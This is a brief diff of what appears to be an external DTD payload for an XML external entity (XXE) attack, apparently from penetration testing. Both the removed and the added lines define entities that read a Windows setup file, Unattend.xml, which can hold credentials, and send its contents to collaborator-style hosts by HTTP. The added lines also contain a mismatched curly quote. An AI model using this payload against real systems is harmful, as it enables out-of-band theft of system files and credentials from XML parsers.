@@ -1,4 +1,3 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/Panther/Unattend.xml">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://f7n2urg7ut34i25ap5vr7rvvwm2dq2.cigitalcollaborator.com/?x=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % all "<!ENTITY send SYSTEM ‘http://npg6rgllo5ryjsfr7bkd9ikxfolf94.pentestcollaborator.com/?collect=%file;'>">
+%all;
+
